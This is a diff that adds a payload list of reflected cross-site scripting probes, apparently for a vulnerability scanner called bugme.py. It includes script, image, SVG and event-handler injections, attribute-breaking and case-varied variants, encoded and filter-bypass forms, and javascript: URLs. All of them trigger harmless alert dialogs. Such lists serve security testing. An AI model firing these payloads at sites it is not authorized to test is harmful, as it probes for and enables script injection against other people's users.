@@ -1,0 +1,56 @@
+# Basic Reflected XSS Payloads
+# Use with: python bugme.py -u "URL" --payloads payloads/reflected.txt
+
+# Basic script tags
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+
+# Image-based
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=confirm(1)>
+
+# SVG-based
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert('XSS')>
+
+# Event handlers
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+
+# Attribute breaking
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+
+# Case variation
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<IMG SRC=x ONERROR=alert(1)>
+
+# Encoding
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+
+# Filter bypass
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+<img src=x onerror=alert`1`>
+
+# URL context
+javascript:alert(1)
+javascript:alert('XSS')
+data:text/html,<script>alert(1)</script>
+
+# Advanced
+<img src=x:alert(1) onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<form action=javascript:alert(1)><input type=submit>
